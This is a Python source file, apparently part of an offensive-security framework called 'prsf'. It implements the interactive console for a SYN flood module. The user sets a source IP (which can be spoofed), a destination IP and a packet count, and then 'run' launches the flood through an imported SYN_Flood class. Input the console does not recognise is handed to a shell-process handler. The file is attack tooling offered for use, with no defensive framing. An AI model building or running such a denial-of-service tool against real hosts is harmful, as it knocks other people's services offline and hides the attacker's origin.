#!/usr/bin/python
import src.source.use
from src.Logging.print_stdout import print_error
from src.banner.color import pycolor_style
from src.process.MainProcess import Process_Shell
import bin.exploit.synFlood
import bin.interfaces.MainConsole
from bin.interfaces.source.help_interfaces.exploit.help_syn import showHelpMessage, showOptionsMessage

source_add = ""
destination_add = ""
count = ""
class Exploit_Syn_Attack(object):
    def __init__(self, commands):
        self.values = commands

    def main_exploit(self):
        try:
            global source_add, destination_add, count
            if self.values == "help":
                print(showHelpMessage())

            elif self.values == "show options":
                print(showOptionsMessage(source_add, destination_add, count))

            elif self.values == "back":
                bin.interfaces.MainConsole.main_interfaces()

            elif "set SRC" in self.values:
                try:
                    source_add = self.values.split()[2]
                    print("SRC ADDRESS => {}".format(source_add))
                except IndexError:
                    print_error("Required the ip source address!!")

            elif "set DST" in self.values:
                try:
                    destination_add = self.values.split()[2]
                    print("DST ADDRESS => {}".format(destination_add))
                except IndexError:
                    print_error("Required the ip destination address!!")

            elif "set COUNT" in self.values:
                try:
                    count = int(self.values.split()[2])
                    print("COUNT => {}".format(count))
                except IndexError:
                    print_error("Required specify size count number!!")

            elif self.values == "run":
                if source_add != "" and destination_add != "" and count != "":
                    syn = bin.exploit.synFlood.SYN_Flood(source_add, destination_add, count)
                    syn.run_syn()
                else:
                    print(showOptionsMessage(source_add, destination_add, count))

            else:
                proc = Process_Shell(self.values)
                proc.main_process()

        except:
            pass

def Main_Interactive_SYN():
    try:
        while True:
            cmd = raw_input("{ln}prsf{ln1} exploit({rd}syn_flood{rd1}) > ".format(
                ln=pycolor_style.L, ln1=pycolor_style.W, rd=pycolor_style.R, rd1=pycolor_style.W
            ))
            syn = Exploit_Syn_Attack(cmd)
            syn.main_exploit()
            if cmd == "exit":
                src.source.use.sys.exit()
    except KeyboardInterrupt:
        print_error('Interrupt by user, command "exit" to quit!!')
        Main_Interactive_SYN()